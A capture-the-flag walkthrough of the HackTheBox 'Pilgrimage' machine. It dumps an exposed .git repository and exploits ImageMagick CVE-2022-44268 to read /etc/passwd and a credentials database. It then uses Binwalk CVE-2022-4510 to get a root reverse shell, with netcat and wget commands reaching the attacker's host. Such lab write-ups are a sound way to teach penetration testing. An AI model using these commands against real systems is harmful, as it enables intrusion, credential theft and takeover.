Pilgrimage: Exposed .git directory, CVE-2022-44268 (vulnerable ImageMagick application allowed arbitrary file read), CVE-2022-4510 (vulnerable Binwalk vulnerability allowed exploitation of script running as root for PE)

Enumeration:
Nmap -sCV -sV -p- –min-rate=1000 10.10.11..219

└─$ nmap -sCV -sV -p- --min-rate=1000 10.10.11.219
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 11:13 EST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
|_http-server-header: nginx/1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


                                                                 

Open web server and ssh server

echo 10.10.11.219 pilgrimage.htb | sudo tee -a /etc/hosts

Given the homepage of pilgrimage.htb, we can see that we can upload files on to shrink
There’s also a login and register feature


Let’s use burpe suite in order to find out what happens exactly when we upload a file

We created a file via
Echo hello > text.jpg and we captured the request via our proxy


POST / HTTP/1.1

Host: pilgrimage.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: multipart/form-data; boundary=---------------------------14999191086045255402620217495

Content-Length: 229

Origin: http://pilgrimage.htb

Connection: close

Referer: http://pilgrimage.htb/

Cookie: PHPSESSID=gcattmsb3jh4kdk6vegmuue5vf

Upgrade-Insecure-Requests: 1



-----------------------------14999191086045255402620217495

Content-Disposition: form-data; name="toConvert"; filename="text.jpg"

Content-Type: image/jpeg



hello


-----------------------------14999191086045255402620217495--


Let’s enumerate for any open directories:
gobuster dir -u http://pilgrimage.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt


Output:
/.git/HEAD            (Status: 200) [Size: 23]
/.git                 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/]
/.git/logs/           (Status: 403) [Size: 153]
/.git/config          (Status: 200) [Size: 92]
/.git/index           (Status: 200) [Size: 3768]
/.htaccess            (Status: 403) [Size: 153]
/.htpasswd            (Status: 403) [Size: 153]
/.hta                 (Status: 403) [Size: 153]
/assets               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/assets/]
/index.php            (Status: 200) [Size: 7621]
/tmp                  (Status: 301) [Size: 169] [--> http://pilgrimage.htb/tmp/]
/vendor               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/vendor/]
Progress: 4734 / 4735 (99.98%)

We see there’s an open directory for .git, let’s use this

https://github.com/arthaud/git-dumper 

┌──(kali㉿kali)-[~/.local/bin]
└─$ ./git-dumper http://pilgrimage.htb/ ./pilgrimage_source


The command successfully worked
┌──(kali㉿kali)-[~/.local/bin]
└─$ cd pilgrimage_source 
                                                                                    
┌──(kali㉿kali)-[~/.local/bin/pilgrimage_source]
└─$ ls
assets         index.php  logout.php  register.php
dashboard.php  login.php  magick      vendor


┌──(kali㉿kali)-[~/.local/bin/pilgrimage_source]
└─$ ./magick --version                                     
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)

https://www.exploit-db.com/exploits/51261 
https://nvd.nist.gov/vuln/detail/CVE-2022-44268 

Description
ImageMagick 7.1.0-49 is vulnerable to Information Disclosure. When it parses a PNG image (e.g., for resize), the resulting image could have embedded the content of an arbitrary. file (if the magick binary has permissions to read it).


Let’s find some PoC that exploits this:
https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC 
https://github.com/kljunowsky/CVE-2022-44268 
https://github.com/voidz0r/CVE-2022-44268 

How to use
Clone the project
git clone https://github.com/voidz0r/CVE-2022-44268


Go into the directory and run cargo
└─$ cargo run "/etc/passwd"
    Updating crates.io index
  Downloaded bitflags v1.3.2
  Downloaded adler v1.0.2
  Downloaded cfg-if v1.0.0
  Downloaded flate2 v1.0.25
  Downloaded hex v0.4.3
  Downloaded crc32fast v1.3.2
  Downloaded miniz_oxide v0.6.2
  Downloaded png v0.17.7
  Downloaded 8 crates (301.4 KB) in 0.23s
   Compiling crc32fast v1.3.2
   Compiling adler v1.0.2
   Compiling cfg-if v1.0.0
   Compiling bitflags v1.3.2
   Compiling hex v0.4.3
   Compiling miniz_oxide v0.6.2
   Compiling flate2 v1.0.25
   Compiling png v0.17.7
   Compiling cve-2022-44268 v0.1.0 (/home/kali/CVE-2022-44268)
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 1.93s
     Running `target/debug/cve-2022-44268 /etc/passwd`
                                                       
This creates a malicious image.png file

Now let’s go back to upload to web server:

We did this and it gave us
http://pilgrimage.htb/shrunk/6727a93a499bc.png


Analyze the resized image
identify -verbose 6727a93a499bc.png

Convert hex to str
python3 -c 'print(bytes.fromhex("726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a"))'


This gave us an output of the victim /etc/passwd file:

b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n'


Going back to our git-dumper, we find this in the index.php file

$db = new PDO('sqlite:/var/db/pilgrimage');

Now let’s rerun exploit to target that:
cargo run "/var/db/pilgrimage"

Upload it:
http://pilgrimage.htb/shrunk/6727abd98cde4.png

Follow the same process

Take the enormous hex data and put it into a file called hex,

Create convert.py and use this script:

└─$ cat convert.py                   
with open("hex", "rb") as f:
     data = bytes.fromhex(f.read().decode())
with open("sql.db", "wb") as f:
     f.write(data)


Now run it and you should get sql.db as a file

└─$ file sql.db                            
sql.db: SQLite 3.x database, last written using SQLite version 3034001, file counter 65, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 65

└─$ sqlite3 sql.db 
SQLite version 3.45.3 2024-04-15 13:34:05
Enter ".help" for usage hints.
sqlite> .tables
images  users 
sqlite> select * from users;
emily|abigchonkyboi123
admin|admin

Use the credentials to log into the SSH server, what we found earlier during NMAP Scan

Initial Access
emily@pilgrimage:~$ cat user.txt 
b5a270dd9fdfb4d9589f4cba8f2f78d6

emily@pilgrimage:~$ sudo -l
[sudo] password for emily: 
Sorry, try again.
[sudo] password for emily: 
Sorry, user emily may not run sudo on pilgrimage.
emily@pilgrimage:~$ id
uid=1000(emily) gid=1000(emily) groups=1000(emily)


emily@pilgrimage:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/umount


Privilege Escalation

By enumerating root processes, we found these:
ps auxww | grep root 

root         744  0.0  0.0   2516   708 ?        S    02:57   0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         745  0.0  0.0   6816  2304 ?        S    02:57   0:00 /bin/bash /usr/sbin/malwarescan.sh



emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh 
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done


By analyzing the script above, we found out when a new file is created, the script uses tail and sed to extract the filename from the output of inotifywait . Then, binwalk is used to extract any binary data and store it in the binout variable.



emily@pilgrimage:~$ binwalk

Binwalk v2.3.2

binout="$(/usr/local/bin/binwalk -e "$filename")"

This CVE below will be used to exploit this vulnerability

https://nvd.nist.gov/vuln/detail/CVE-2022-4510 
Current Description
A path traversal vulnerability was identified in ReFirm Labs binwalk from version 2.1.2b through 2.3.3 included. By crafting a malicious PFS filesystem file, an attacker can get binwalk's PFS extractor to extract files at arbitrary locations when binwalk is run in extraction mode (-e option). Remote code execution can be achieved by building a PFS filesystem that, upon extraction, would extract a malicious binwalk module into the folder .config/binwalk/plugins. This vulnerability is associated with program files src/binwalk/plugins/unpfs.py. This issue affects binwalk from 2.1.2b through 2.3.3 included.

PoC: https://www.exploit-db.com/exploits/51249 

└─$ python3 cve.py image.png 10.10.14.11 4444

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.


The script above created binwalk_exploit.png, now move it to our home directory

Nc -nvlp 4444 to listen for reverse shell connections based on script
Python3 -m http.server to allow victim to download the binwalk_exploit.png


Now go to victim’s shell and run these:
cd /var/www/pilgrimage.htb/shrunk
wget 10.10.14.11:8000/binwalk_exploit.png


cat root.txt
6886cf0c7b837466863138e59f69fbc1

We have now officially gained root access

